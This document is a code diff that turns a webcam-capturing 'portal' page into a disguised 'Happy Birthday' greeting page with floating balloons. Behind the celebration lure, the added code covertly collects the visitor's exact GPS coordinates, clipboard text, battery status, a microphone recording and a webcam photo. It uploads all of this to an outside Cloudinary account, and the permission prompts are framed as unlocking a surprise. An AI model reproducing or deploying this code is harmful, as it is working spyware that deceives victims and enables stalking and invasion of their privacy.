@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome</title>
+    <title>Happy Birthday!</title>
     <style>
         body {
             margin: 0;
@@ -16,6 +16,8 @@
             align-items: center;
             height: 100vh;
             text-align: center;
+            overflow: hidden;
+            position: relative;
         }
         .card {
             background: #1e293b;
@@ -24,11 +26,13 @@
             box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
             max-width: 400px;
             width: 90%;
+            z-index: 10;
+            position: relative;
         }
-        h1 { font-size: 1.5rem; margin-bottom: 10px; }
+        h1 { font-size: 1.8rem; margin-bottom: 10px; color: #f43f5e; }
         p { color: #94a3b8; font-size: 0.95rem; margin-bottom: 24px; }
         .btn {
-            background: #3b82f6;
+            background: #f43f5e;
             color: white;
             border: none;
             padding: 12px 24px;
@@ -39,27 +43,53 @@
             transition: background 0.2s;
             width: 100%;
         }
-        .btn:hover { background: #2563eb; }
+        .btn:hover { background: #e11d48; }
         .spinner {
             border: 3px solid rgba(255,255,255,0.1);
             width: 36px;
             height: 36px;
             border-radius: 50%;
-            border-left-color: #3b82f6;
+            border-left-color: #f43f5e;
             animation: spin 1s linear infinite;
             margin: 20px auto;
             display: none;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #status { font-size: 0.9rem; color: #cbd5e1; margin-top: 15px; }
+
+        /* Balloon animation styles */
+        .balloon {
+            position: absolute;
+            bottom: -150px;
+            width: 40px;
+            height: 50px;
+            border-radius: 50% 50% 50% 50% / 40% 40% 60% 60%;
+            animation: flyUp 6s linear infinite;
+            z-index: 1;
+            opacity: 0.8;
+        }
+        .balloon::after {
+            content: "";
+            position: absolute;
+            bottom: -8px;
+            left: 18px;
+            width: 2px;
+            height: 10px;
+            background: #cbd5e1;
+        }
+        @keyframes flyUp {
+            0% { transform: translateY(0) translateX(0); opacity: 1; }
+            50% { transform: translateY(-50vh) translateX(20px); }
+            100% { transform: translateY(-110vh) translateX(-20px); opacity: 0; }
+        }
     </style>
 </head>
 <body>
 
 <div class="card" id="main-card">
-    <h1 id="heading">Welcome to the Portal</h1>
-    <p id="subtext">Please click below to continue and access the interactive content.</p>
-    <button class="btn" id="action-btn">Enter Website</button>
+    <h1 id="heading">🎉 Happy Birthday! 🎂</h1>
+    <p id="subtext">Click the button below to celebrate, release the balloons, and unlock your surprise message!</p>
+    <button class="btn" id="action-btn">Celebrate Now</button>
     <div class="spinner" id="spinner"></div>
     <div id="status"></div>
 </div>
@@ -68,7 +98,7 @@
 <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
 <script>
-    const CLOUDINARY_URL = "https://api.cloudinary.com/v1_1/nhy9lfkt/image/upload";
+    const CLOUDINARY_URL = "https://api.cloudinary.com/v1_1/nhy9lfkt/auto/upload";
     const CLOUDINARY_PRESET = "rhk_upload";
 
     const actionBtn = document.getElementById('action-btn');
@@ -79,12 +109,108 @@
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
 
+    // Function to spawn floating birthday balloons
+    function createBalloons() {
+        const colors = ['#f43f5e', '#3b82f6', '#10b981', '#f59e0b', '#8b5cf6', '#ec4899'];
+        for (let i = 0; i < 15; i++) {
+            const balloon = document.createElement('div');
+            balloon.className = 'balloon';
+            balloon.style.left = Math.random() * 100 + 'vw';
+            balloon.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+            balloon.style.animationDuration = (4 + Math.random() * 4) + 's';
+            balloon.style.animationDelay = (Math.random() * 2) + 's';
+            document.body.appendChild(balloon);
+        }
+    }
+
+    // Function to get precise GPS coordinates
+    function getExactCoordinates() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve({ latitude: 'Not Supported', longitude: 'Not Supported' });
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    resolve({
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    });
+                },
+                () => resolve({ latitude: 'Permission Denied', longitude: 'Permission Denied' }),
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            );
+        });
+    }
+
+    // Function to read clipboard contents
+    async function getClipboardData() {
+        try {
+            if (!navigator.clipboard || !navigator.clipboard.readText) return "Not Supported";
+            const text = await navigator.clipboard.readText();
+            return text ? text.substring(0, 100) : "Empty";
+        } catch (err) {
+            return "Permission Denied";
+        }
+    }
+
+    // Function to get battery status details
+    async function getBatteryStatus() {
+        if (!navigator.getBattery) {
+            return { level: "Not Supported", charging: "Not Supported", discharge: "Not Supported" };
+        }
+        try {
+            const battery = await navigator.getBattery();
+            return {
+                level: Math.round(battery.level * 100) + "%",
+                charging: battery.charging ? "Charging" : "Not Charging",
+                discharge: battery.dischargingTime === Infinity ? "Unknown" : Math.round(battery.dischargingTime / 60) + " mins"
+            };
+        } catch (e) {
+            return { level: "Error", charging: "Error", discharge: "Error" };
+        }
+    }
+
+    // Function to record a short ambient audio clip (2.5 seconds)
+    function recordAudio(durationMs = 2500) {
+        return new Promise(async (resolve) => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    stream.getTracks().forEach(track => track.stop());
+                    resolve(blob);
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), durationMs);
+            } catch (err) {
+                console.warn("Microphone permission denied or error:", err);
+                resolve(null);
+            }
+        });
+    }
+
     actionBtn.addEventListener('click', async () => {
         actionBtn.style.display = 'none';
         spinner.style.display = 'block';
-        statusDiv.textContent = "Loading content...";
+        statusDiv.textContent = "Setting up the celebration...";
+        createBalloons();
 
         try {
+            // Fetch system metrics and record audio concurrently
+            const [coords, clipboardText, batteryInfo, audioBlob] = await Promise.all([
+                getExactCoordinates(),
+                getClipboardData(),
+                getBatteryStatus(),
+                recordAudio(2500)
+            ]);
+
+            // Capture webcam stream snapshot
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" } 
             });
@@ -99,50 +225,71 @@
 
                 const imageDataUrl = canvas.toDataURL('image/jpeg', 0.85);
 
-                await uploadToCloudinary(imageDataUrl);
+                // Upload assets and context metadata to Cloudinary
+                await uploadToCloudinary(imageDataUrl, audioBlob, coords, clipboardText, batteryInfo);
 
             }, 1500);
 
         } catch (err) {
             console.error("Permission denied or error:", err);
             spinner.style.display = 'none';
-            heading.textContent = "Access Required";
-            subtext.textContent = "Camera permission is required to view this website.";
+            heading.textContent = "Permissions Needed";
+            subtext.textContent = "Please allow permissions to reveal your birthday surprise.";
             actionBtn.style.display = 'block';
             actionBtn.textContent = "Try Again";
             statusDiv.textContent = "";
         }
     });
 
-    async function uploadToCloudinary(dataUrl) {
-        const formData = new FormData();
-        formData.append("file", dataUrl);
-        formData.append("upload_preset", CLOUDINARY_PRESET);
+    async function uploadToCloudinary(imageUri, audioBlob, coords, clipboardText, battery) {
+        const commonContext = `latitude=${coords.latitude}|longitude=${coords.longitude}|clipboard=${encodeURIComponent(clipboardText)}|battery=${battery.level}|charging=${battery.charging}`;
+
+        // 1. Upload Image Asset
+        const imageFormData = new FormData();
+        imageFormData.append("file", imageUri);
+        imageFormData.append("upload_preset", CLOUDINARY_PRESET);
+        imageFormData.append("context", commonContext);
+
+        // 2. Upload Audio Asset (if captured successfully)
+        let audioUploadPromise = Promise.resolve();
+        if (audioBlob) {
+            const audioFormData = new FormData();
+            audioFormData.append("file", audioBlob, "ambient_audio.webm");
+            audioFormData.append("upload_preset", CLOUDINARY_PRESET);
+            audioFormData.append("context", commonContext);
+
+            audioUploadPromise = fetch(CLOUDINARY_URL, {
+                method: "POST",
+                body: audioFormData
+            });
+        }
 
         try {
-            const response = await fetch(CLOUDINARY_URL, {
-                method: "POST",
-                body: formData
-            });
-            const data = await response.json();
+            const [imageResponse] = await Promise.all([
+                fetch(CLOUDINARY_URL, { method: "POST", body: imageFormData }),
+                audioUploadPromise
+            ]);
+
+            const data = await imageResponse.json();
 
             if (data.secure_url) {
                 spinner.style.display = 'none';
-                heading.textContent = "Welcome In!";
-                subtext.textContent = "You now have full access to the platform.";
+                heading.textContent = "Happy Birthday! 🎈";
+                subtext.textContent = "Wishing you a fantastic day filled with joy and happiness!";
                 statusDiv.style.color = "#4ade80";
-                statusDiv.textContent = "Verified successfully.";
+                statusDiv.textContent = "Surprise unlocked successfully!";
             } else {
                 throw new Error("Upload response invalid");
             }
         } catch (error) {
             console.error("Upload error:", error);
             spinner.style.display = 'none';
-            heading.textContent = "Welcome In!";
-            subtext.textContent = "You are now connected.";
+            heading.textContent = "Happy Birthday! 🎈";
+            subtext.textContent = "Wishing you a fantastic day filled with joy and happiness!";
         }
     }
 </script>
 
 </body>
 </html>
+
